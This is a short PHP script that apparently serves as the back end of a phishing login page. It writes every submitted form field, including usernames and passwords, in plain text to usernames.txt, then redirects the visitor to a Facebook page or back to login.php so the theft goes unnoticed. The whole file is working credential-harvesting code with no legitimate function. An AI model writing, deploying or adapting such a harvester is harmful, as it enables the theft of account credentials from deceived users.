<?php
session_start();
$gadasvla = "https://www.facebook.com/ghs.org.ge";
if (isset($_SESSION['gadasvla']) && $_SESSION['gadasvla'] == 'ki') {
    header("Location:" . $gadasvla );
} elseif (isset($_SESSION['gadasvla']) && $_SESSION['gadasvla'] == 'ara') {
    header("Location:http://" . $_SERVER['HTTP_HOST'] . "/login.php" );
}
$handle = fopen("usernames.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?> 